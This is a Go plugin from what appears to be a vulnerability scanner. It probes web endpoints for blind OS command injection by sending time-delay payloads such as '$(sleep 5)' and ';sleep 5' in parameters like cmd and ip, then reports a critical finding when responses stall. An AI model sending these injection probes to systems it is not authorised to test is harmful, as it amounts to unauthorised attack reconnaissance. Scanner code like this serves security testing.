package plugins

import (
	"DORM/models"
	"fmt"
	"time"
)

// 41. BLIND RCE (V2.1 - SMART GUESSING)
type BlindRCEPlugin struct{}

func (p *BlindRCEPlugin) Name() string { return "Blind Command Injection (Smart)" }

func (p *BlindRCEPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	endpoints := []string{"/", "/ping.php", "/status.php", "/check.php", "/test.php", "/admin.php"}
	params := []string{"cmd", "ip", "host", "addr", "query", "file", "download", "path"}

	sleepSeconds := 5

	payloads := []string{
		fmt.Sprintf("$(sleep %d)", sleepSeconds),
		fmt.Sprintf("%%26sleep+%d", sleepSeconds),
		fmt.Sprintf("|sleep %d", sleepSeconds),
		fmt.Sprintf(";sleep %d", sleepSeconds),
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range payloads {
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, payload)

				start := time.Now()
				resp, err := client.Get(targetURL)
				duration := time.Since(start)

				if err == nil {
					resp.Body.Close()
				}

				if duration.Seconds() >= float64(sleepSeconds) {
					return &models.Vulnerability{
						Target:      target,
						Name:        "Blind OS Command Injection",
						Severity:    "CRITICAL",
						CVSS:        9.8,
						Description: fmt.Sprintf("Server executed system command via time-delay.\nURL: %s\nPayload: %s\nDelay: %v", targetURL, payload, duration),
						Solution:    "Disable system command execution functions (exec, system, passthru).",
						Reference:   "OWASP Command Injection",
					}
				}
			}
		}
	}
	return nil
}
